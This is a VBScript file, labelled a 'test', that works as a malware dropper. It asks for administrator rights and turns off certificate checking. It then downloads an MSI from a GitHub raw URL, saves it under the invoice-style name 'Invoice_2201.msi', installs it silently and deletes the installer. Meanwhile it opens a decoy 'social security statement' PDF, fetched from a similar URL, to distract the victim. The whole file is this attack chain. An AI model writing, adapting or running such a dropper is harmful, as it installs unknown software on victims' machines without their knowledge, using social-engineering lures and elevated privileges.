' Minimal Test VBS - Plain URLs, No Junk
On Error Resume Next

' Request elevation if not already elevated
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
    WScript.Quit
End If

Dim fs, tempPath, logFile, shell
Set fs = CreateObject("Scripting.FileSystemObject")
tempPath = fs.GetSpecialFolder(2) & "\"
Set logFile = fs.CreateTextFile(tempPath & "test_debug.txt", True)
logFile.WriteLine "Test started: " & Now

' Plain URLs
Dim msiUrl, pdfUrl, tempMsi, tempPdf
msiUrl = "https://raw.github.com/rindinhgi0/velocityexco/main/social-security-statement-upd.msi"
pdfUrl = "https://raw.github.com/rindinhgi0/velocity-serenetiy/main/social-security-statement-upd.pdf"
tempMsi = tempPath & "Invoice_2201.msi"
tempPdf = tempPath & "social-security-statement-upd.pdf"

' MSI Download and quiet install
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.Open "GET", msiUrl, False
http.setOption 2, 13056  ' Cert bypass
http.Send
logFile.WriteLine "MSI Status: " & http.Status
If http.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write http.ResponseBody
    stream.SaveToFile tempMsi, 2
    stream.Close
    logFile.WriteLine "MSI saved"
    
    ' Quiet install
    Set shell = CreateObject("WScript.Shell")
    shell.Run Chr(34) & "%SystemRoot%\system32\msiexec.exe" & Chr(34) & " /i " & Chr(34) & tempMsi & Chr(34) & " /quiet ALLUSERS=2", 1, True
    logFile.WriteLine "MSI installed quietly"
    
    fs.DeleteFile tempMsi
Else
    logFile.WriteLine "MSI fail: " & http.Status
End If

' PDF Download and launch
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.Open "GET", pdfUrl, False
http.setOption 2, 13056
http.Send
logFile.WriteLine "PDF Status: " & http.Status
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write http.ResponseBody
    stream.SaveToFile tempPdf, 2
    stream.Close
    
    shell.Run Chr(34) & tempPdf & Chr(34), 1, False
    logFile.WriteLine "PDF opened"
    
End If

logFile.Close